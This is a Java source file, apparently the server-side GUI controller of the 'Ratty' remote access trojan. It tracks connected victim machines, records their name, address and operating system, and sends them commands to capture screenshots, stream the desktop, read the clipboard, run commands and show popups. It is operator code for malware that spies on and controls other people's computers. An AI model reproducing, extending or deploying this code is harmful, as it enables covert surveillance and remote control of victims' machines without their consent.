package de.sogomn.rat.server.gui;

import java.awt.image.BufferedImage;
import java.util.ArrayList;

import de.sogomn.rat.ActiveClient;
import de.sogomn.rat.IClientObserver;
import de.sogomn.rat.packet.ClipboardPacket;
import de.sogomn.rat.packet.CommandPacket;
import de.sogomn.rat.packet.DesktopStreamPacket;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;
import de.sogomn.rat.packet.PopupPacket;
import de.sogomn.rat.packet.ScreenshotPacket;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.IServerObserver;
import de.sogomn.rat.util.FrameEncoder.IFrame;

public final class RattyGuiController implements IServerObserver, IClientObserver, IGuiController {
	
	private RattyGui gui;
	
	private ArrayList<ServerClient> clients;
	private long nextId;
	
	public RattyGuiController(final RattyGui gui) {
		this.gui = gui;
		
		clients = new ArrayList<ServerClient>();
		
		gui.setController(this);
	}
	
	private ServerClient getServerClient(final long id) {
		for (final ServerClient client : clients) {
			if (client.id == id) {
				return client;
			}
		}
		
		return null;
	}
	
	private ServerClient getServerClient(final ActiveClient client) {
		for (final ServerClient serverClient : clients) {
			if (serverClient.client == client) {
				return serverClient;
			}
		}
		
		return null;
	}
	
	private IPacket getPacket(final String command) {
		if (command == RattyGui.POPUP) {
			return PopupPacket.create();
		} else if (command == RattyGui.FREE) {
			return new FreePacket();
		} else if (command == RattyGui.SCREENSHOT) {
			return new ScreenshotPacket();
		} else if (command == RattyGui.COMMAND) {
			return CommandPacket.create();
		} else if (command == RattyGui.DESKTOP) {
			return new DesktopStreamPacket(true);
		} else if (command == RattyGui.CLIPBOARD) {
			return new ClipboardPacket();
		}
		
		return null;
	}
	
	@Override
	public void packetReceived(final ActiveClient client, final IPacket packet) {
		final ServerClient serverClient = getServerClient(client);
		
		if (serverClient.isLoggedIn()) {
			if (packet instanceof ScreenshotPacket) {
				final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
				final BufferedImage image = screenshot.getImage();
				
				serverClient.getDisplayPanel().showImage(image);
			} else if (packet instanceof DesktopStreamPacket && serverClient.isStreamingDesktop()) {
				final DesktopStreamPacket stream = (DesktopStreamPacket)packet;
				final IFrame frame = stream.getFrame();
				final int screenWidth = stream.getScreenWidth();
				final int screenHeight = stream.getScreenHeight();
				final DesktopStreamPacket request = new DesktopStreamPacket();
				
				serverClient.getDisplayPanel().showFrame(frame, screenWidth, screenHeight);
				client.addPacket(request);
			} else {
				packet.execute(client);
			}
		} else if (packet instanceof InformationPacket) {
			final InformationPacket information = (InformationPacket)packet;
			final long id = serverClient.id;
			final String name = information.getName();
			final String address = client.getAddress();
			final String os = information.getOs();
			final String version = information.getVersion();
			
			serverClient.logIn(name, os, version);
			gui.addTableRow(id, name, address, os, version);
		}
	}
	
	@Override
	public void disconnected(final ActiveClient client) {
		final long id = getServerClient(client).id;
		
		client.setObserver(null);
		client.close();
		clients.remove(client);
		
		gui.removeTableRow(id);
	}
	
	@Override
	public void clientConnected(final ActiveServer server, final ActiveClient client) {
		final long id = nextId++;
		final ServerClient serverClient = new ServerClient(id, client);
		final InformationPacket packet = new InformationPacket();
		
		client.setObserver(this);
		clients.add(serverClient);
		client.start();
		client.addPacket(packet);
	}
	
	@Override
	public void closed(final ActiveServer server) {
		//...
	}
	
	@Override
	public void userInput(final String command) {
		final long lastIdClicked = gui.getLastIdClicked();
		final ServerClient serverClient = getServerClient(lastIdClicked);
		final ActiveClient client = serverClient.client;
		final IPacket packet = getPacket(command);
		
		if (packet != null) {
			client.addPacket(packet);
		}
		
		if (command == RattyGui.DESKTOP) {
			serverClient.setStreamingDesktop(true);
			gui.setStreaming(lastIdClicked, true);
		} else if (command == RattyGui.DESKTOP_STOP) {
			serverClient.setStreamingDesktop(false);
			gui.setStreaming(lastIdClicked, false);
		}
	}
	
}
